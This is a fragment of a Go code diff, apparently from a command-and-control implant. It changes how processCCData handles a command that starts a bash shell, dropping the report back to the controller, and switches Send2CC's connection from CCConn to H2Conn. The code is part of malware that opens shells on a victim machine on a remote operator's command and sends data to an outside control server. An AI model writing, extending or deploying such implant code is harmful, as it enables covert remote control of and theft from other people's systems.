@@ -67,9 +67,7 @@ func processCCData(data *TunData) {
 				return
 			}
 			ActivateShell()
-			out = "started bash shell"
-			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
-			goto send
+			return
 		}
 
 		// current working directory
@@ -178,7 +176,7 @@ func IsProcAlive(procName string) (alive bool, procs []*os.Process) {
 
 // Send2CC send TunData to CC
 func Send2CC(data *TunData) error {
-	var out = json.NewEncoder(CCConn)
+	var out = json.NewEncoder(H2Conn)
 
 	err := out.Encode(data)
 	if err != nil {
